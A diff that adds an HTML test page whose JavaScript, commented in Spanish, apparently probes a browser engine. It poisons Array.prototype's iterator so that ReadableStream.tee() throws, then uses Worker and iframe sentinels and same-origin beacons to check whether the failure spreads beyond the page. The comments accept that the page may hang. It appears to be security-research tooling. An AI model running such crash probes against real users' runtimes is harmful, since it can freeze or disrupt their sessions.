@@ -1,0 +1,68 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>FA-v25-killscope — press-16: el tee-killer, ¿contexto local o VM envenenada? (diseño G53)</title></head>
+<body><pre id="out">FA-v25-killscope…</pre>
+<script>
+(function(){
+"use strict";
+/* FA-v25-killscope — press-16 (diseño G53-TEEKILLER, mejorado sobre Sol).
+ * Pregunta: el kill del tee (iterador que tira) — ¿mata solo ESTE contexto
+ * o envenena la commonVM (realms hermanos)? Sentinels: Worker (VM propia,
+ * control — debe sobrevivir) e iframe same-origin (mismo hilo, otro realm).
+ * Núcleo G53: yield-OBJETO en next#1 (el TypeError del funnel no preemta
+ * al marker), beacon P2 DENTRO del next#2 ANTES de tirar, AFTER tras tee(),
+ * LOOP-beacons si el hilo revive.
+ * Riesgo conocido y aceptado: la página se wedgea (3/3 recuperable
+ * navegando). Los sentinels siguen reportando aunque esta página muera. */
+var RID="v25k"+Date.now().toString(36).slice(-13);
+function bk(s,b){try{fetch("/beacon/V25-"+s,{method:"POST",cache:"no-store",keepalive:true,headers:{ContentType:"application/json","Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,500)})}).catch(function(){});}catch(e){}}
+
+var dr="-",rt="-";
+try{ dr=typeof window.deriveRuntime; rt=(dr==="object"&&window.deriveRuntime)?typeof window.deriveRuntime.run:"-"; }catch(e){}
+bk("L","v25-killscope; dr="+dr+"; rt="+rt);
+
+/* S1 — sentinels: Worker (VM propia) + iframe same-origin (otro realm, mismo hilo) */
+var wkOK="-", frOK="-";
+try{
+  var wsrc="setInterval(function(){fetch('/beacon/V25-WKHB?x='+Date.now(),{method:'POST',body:'{}'}).catch(function(){});},1500);";
+  var w=new Worker(URL.createObjectURL(new Blob([wsrc],{type:"text/javascript"})));
+  wkOK="spawned";
+}catch(e){ wkOK="E:"+String((e&&e.message)||e).slice(0,40); }
+try{
+  var f=document.createElement("iframe");
+  f.srcdoc="<script>setInterval(function(){fetch('/beacon/V25-IFRHB?x='+Date.now(),{method:'POST',body:'{}'}).catch(function(){});},1500);<\/script>";
+  document.body.appendChild(f);
+  frOK="spawned";
+}catch(e){ frOK="E:"+String((e&&e.message)||e).slice(0,40); }
+bk("S1","worker="+wkOK+";iframe="+frOK);
+
+/* S2 — el kill probe (G53): next#1 yield-OBJETO; next#2: beacon P2 y LUEGO tira */
+bk("P1","arm: poison con yield-objeto en next#1, marker en next#2");
+var OI=Array.prototype[Symbol.iterator];
+Array.prototype[Symbol.iterator]=function(){
+  var i=0, t=this;
+  return { next:function(){
+    i++;
+    if(i===1){ return {value:{},done:false}; }      /* objeto — el funnel NO tira */
+    if(i===2){
+      bk("P2","DENTRO de next#2, ANTES del throw — el marker reina");
+      throw new Error("KILLSCOPE-MARKER");
+    }
+    return {done:true};
+  }};
+};
+
+var after="DEAD";
+try{
+  new ReadableStream({}).tee();
+  after="SURVIVED-no-throw";
+}catch(e){
+  after="SURVIVED-caught:"+String((e&&e.message)||e).slice(0,40);
+}
+bk("AFTER",after);
+
+/* S3 — si llegamos aquí: el hilo revive → loop-beacons prueban ejecución continua */
+var n=0;
+for(var k=0;k<200000;k++){ n++; if(n%50000===0) bk("LOOP","iter "+n); }
+bk("Z","FA-v25-killscope complete — el hilo NO murió esta vez");
+})();
+</script></body></html>
